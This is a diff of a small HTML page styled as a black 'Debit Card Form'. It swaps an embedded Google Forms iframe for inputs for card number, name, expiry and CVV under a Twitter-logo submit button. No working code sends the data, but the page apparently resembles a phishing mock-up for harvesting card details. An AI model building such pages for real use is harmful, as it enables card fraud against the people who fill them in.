@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Card Form</title>
+  <title>Debit Card Form</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -16,49 +16,73 @@
     .card {
       position: relative;
       width: 420px;
-      height: 820px; /* adjusted for form */
+      height: 400px;
       background-color: #000000; /* black background */
       border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+      padding: 25px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
       color: white;
-      overflow: hidden;
       display: flex;
       flex-direction: column;
+      justify-content: space-between;
     }
 
-    .card iframe {
+    label {
+      font-weight: bold;
+      font-size: 14px;
+      display: block;
+      margin-top: 10px;
+    }
+
+    input {
       width: 100%;
-      flex: 1; /* fill remaining space */
+      padding: 12px 15px;
+      margin-top: 5px;
+      border-radius: 8px;
       border: none;
-      border-radius: 12px;
-      margin-bottom: 15px;
+      font-size: 16px;
+      box-sizing: border-box;
+      background-color: #111111;
+      color: white;
     }
 
-    /* Debit card input bar style */
-    .debit-bar {
+    .row {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .row input {
+      flex: 1;
+    }
+
+    .submit-bar {
       display: flex;
       align-items: center;
-      background-color: #111111; /* slightly lighter black */
+      justify-content: center;
+      background-color: #1c1c1c; /* darker black */
       border-radius: 10px;
-      padding: 12px 15px;
-      box-sizing: border-box;
+      padding: 12px;
+      cursor: pointer;
+      margin-top: 15px;
+      transition: 0.3s;
     }
 
-    .debit-bar img {
+    .submit-bar:hover {
+      background-color: #333333;
+    }
+
+    .submit-bar img {
       height: 24px;
       width: 24px;
       margin-right: 12px;
-      filter: invert(100%); /* make logo white on black */
+      filter: invert(100%); /* white logo on black */
     }
 
-    .debit-bar input {
-      flex: 1;
-      background: transparent;
-      border: none;
+    .submit-bar span {
       color: white;
+      font-weight: bold;
       font-size: 16px;
-      outline: none;
     }
 
   </style>
@@ -66,21 +90,29 @@
 <body>
 
 <div class="card">
-  <iframe 
-    src="https://docs.google.com/forms/d/e/1FAIpQLSeLOQkeADnMfApi9CY7nVq9wf-mj8Ljsm8VLbbjIO6Rg0y3AQ/viewform?embedded=true"
-    width="100%" 
-    height="100%" 
-    frameborder="0" 
-    marginheight="0" 
-    marginwidth="0">
-    Loading…
-  </iframe>
+  <form>
+    <label>Card Number</label>
+    <input type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
 
-  <!-- Debit card input bar -->
-  <div class="debit-bar">
-    <img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter Logo">
-    <input type="text" placeholder="Enter card details">
-  </div>
+    <label>Cardholder Name</label>
+    <input type="text" placeholder="John Doe">
+
+    <div class="row">
+      <div>
+        <label>Exp Date</label>
+        <input type="text" placeholder="MM/YY" maxlength="5">
+      </div>
+      <div>
+        <label>CVV</label>
+        <input type="text" placeholder="XXX" maxlength="3">
+      </div>
+    </div>
+
+    <div class="submit-bar">
+      <img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter Logo">
+      <span>Submit</span>
+    </div>
+  </form>
 </div>
 
 </body>
